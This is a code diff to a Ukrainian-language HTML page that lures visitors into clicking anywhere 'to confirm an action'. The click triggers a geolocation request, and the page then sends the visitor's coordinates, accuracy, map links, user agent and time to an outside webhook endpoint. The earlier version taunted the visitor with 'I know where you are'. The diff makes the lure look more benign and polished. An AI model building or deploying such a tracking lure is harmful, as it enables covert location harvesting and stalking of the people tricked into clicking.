@@ -2,18 +2,63 @@
 <html lang="uk">
 <head>
 <meta charset="UTF-8">
-<title>Скажи де ти</title>
+<title>Send location</title>
+
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+  }
+
+  body {
+    background: linear-gradient(135deg, #4e54c8, #8f94fb);
+    font-family: Arial, sans-serif;
+    color: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+  }
+
+  .box {
+    background: rgba(0, 0, 0, 0.3);
+    padding: 30px;
+    border-radius: 12px;
+    max-width: 420px;
+  }
+
+  h1 {
+    margin-top: 0;
+    font-size: 22px;
+  }
+
+  p {
+    opacity: 0.9;
+    font-size: 15px;
+  }
+</style>
 </head>
 <body>
 
-<p>Натисніть будь-де на сторінці, щоб підтвердити дію</p>
+<div class="box">
+  <h1>Підтвердження дії</h1>
+  <p>
+    Натисніть будь-де на сторінці,<br>
+    щоб дозволити визначення місця
+  </p>
+</div>
 
 <script>
+let sent = false;
+
 function sendGeoOnce() {
-  document.removeEventListener("click", sendGeoOnce);
+  if (sent) return;
+  sent = true;
 
   if (!navigator.geolocation) {
-    alert("Гео не підтримується");
+    alert("Геолокація не підтримується браузером");
     return;
   }
 
@@ -29,13 +74,13 @@ function sendGeoOnce() {
         "#map=17/" + lat + "/" + lon;
 
       const payload = {
-        lat: lat,
-        lon: lon,
+        latitude: lat,
+        longitude: lon,
+        accuracy: pos.coords.accuracy,
         google_map: googleMap,
         openstreet_map: openStreetMap,
-        accuracy: pos.coords.accuracy,
-        time: new Date().toISOString(),
-        ua: navigator.userAgent
+        user_agent: navigator.userAgent,
+        time: new Date().toISOString()
       };
 
       fetch("https://app.hooklistener.com/w/my-first-endpoint-ph72/", {
@@ -46,10 +91,11 @@ function sendGeoOnce() {
         body: JSON.stringify(payload)
       });
 
-      alert("Я знаю де ти");
+      document.querySelector(".box").innerHTML =
+        "<h1>Дякуємо</h1><p>Локацію передано</p>";
     },
     (err) => {
-      alert("Помилка: " + err.message);
+      alert("Помилка геолокації: " + err.message);
     }
   );
 }
